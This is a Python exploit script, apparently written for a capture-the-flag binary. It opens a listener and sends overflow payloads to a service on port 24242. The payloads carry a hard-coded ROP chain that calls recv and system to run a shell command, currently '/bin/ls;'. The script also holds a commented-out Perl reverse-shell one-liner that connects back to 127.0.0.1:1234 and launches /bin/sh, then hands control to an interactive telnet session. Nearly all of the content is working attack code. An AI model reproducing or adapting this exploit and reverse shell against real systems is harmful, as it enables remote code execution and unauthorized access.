#!/usr/bin/env python
import socket
import struct
import telnetlib
import time
import traceback
import binascii

# sc = "perl -e \'use Socket;$i=\"127.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\'"
sc = "/bin/ls;"
# sc = "echo SIQPWNED"
pad_chr = b"\xff"

def server_connect():
	conn, client_address = svr_sock.accept()
	print("Connected: %s:%d" % client_address)
	return conn



def connect():
	conn = server_connect()
	try:
		dat = ""
		dat += struct.pack('<H',0x1)
		dat += struct.pack('<H',0x40)
		dat += struct.pack('<I',0x400)
		conn.send(dat)
		dat = ""
		dat += "\xff"*(0x40)
		dat += struct.pack('<B',0x84)
		dat += struct.pack('>I',0xff)
		dat += "E"
		dat += "EEE"
		dat += "A"*(0x1af-157-50-4)
		rop = ""
		rop += struct.pack('<I',0x8048A10) # recv
		rop += struct.pack('<I',0x08049768) # pops
		rop += struct.pack('<I',0x4)
		rop += struct.pack('<I',0x804c0d0)
		rop += struct.pack('<I',len(sc))
		rop += struct.pack('<I',0x0)
		rop += struct.pack('<I',0x80488E0) # system
		rop += struct.pack('<I',0x08049768+3)
		rop += struct.pack('<I',0x804c0d0)
		rop += struct.pack('<I',0x8049678)
		dat += rop
		dat += "A"*(157+50+4-len(rop))
		dat += "\x80"
		dat += "A"*(0x250)
		conn.send(dat)
		conn.recv(1024)
	finally:
		conn.close()
def connect2():
	conn = server_connect()
	try:
		dat = ""
		dat += struct.pack('<H',0x1)
		dat += struct.pack('<H',0x40)
		dat += struct.pack('<I',0x400)
		conn.send(dat)
		dat = ""
		dat += "\xff"*(0x40)
		dat += struct.pack('<B',0x84)
		dat += struct.pack('>I',0xffffffff)
		dat += "E"
		dat += "EEE"
		dat += "A"*(0x1af-157-50-4)
		rop = ""
		rop += struct.pack('<I',0x8048A10) # recv
		rop += struct.pack('<I',0x08049768) # pops
		rop += struct.pack('<I',0x4)
		rop += struct.pack('<I',0x804c0d0)
		rop += struct.pack('<I',len(sc))
		rop += struct.pack('<I',0x0)
		rop += struct.pack('<I',0x80488E0)
		rop += struct.pack('<I',0x08049768+3)
		rop += struct.pack('<I',0x804c0d0)
		rop += struct.pack('<I',0x804918F)
		dat += rop
		dat += "A"*(157+50+4-len(rop))
		dat += "\x80"
		dat += "A"*(0x250)
		conn.send(dat)
	finally:
		conn.close()

def boom():
	conn = server_connect()
	try:
		conn.send(struct.pack('<HHI', 0x1, 0x4, 0x4))
		conn.send(pad_chr * 4 + b"\x84\x7f\xff\xff\xff")
		#data = conn.recv(1024)
		#if data != b" DONE":
		#	print("Received inp data: %s" % binascii.hexlify(data))
	finally:
		conn.close()

bufil_min, bufil_cnt, bufil_max = 0x31, 0x31-1, 0x31+8
while True:
	svr_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		svr_sock.settimeout(3)
		svr_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		svr_sock.bind(('0.0.0.0', 0))
		svr_name, svr_port = svr_sock.getsockname()
		svr_sock.listen(5)
		print("+=======+STEP+======= %s:%d" % (svr_name, svr_port))

		ms = socket.create_connection(['0',24242])
		try:
			ms.send(struct.pack('<HH', bufil_cnt + 1, svr_port))
			for _ in xrange((bufil_cnt)/2):
				connect()
				boom()
				time.sleep(1)
				ms.send(sc)
			#data = ms.recv(100)
			if b"SIQPWNED" in data:
				t = telnetlib.Telnet()
				t.sock = ms
				t.interact()
		finally:
			ms.close()
	except socket.timeout:
		print("Timeout!")
		if bufil_cnt > bufil_min:
			bufil_cnt -= 1
	except Exception:
		traceback.print_exc()
	else:
		if bufil_cnt < bufil_max:
			bufil_cnt += 1
	finally:
		svr_sock.close()




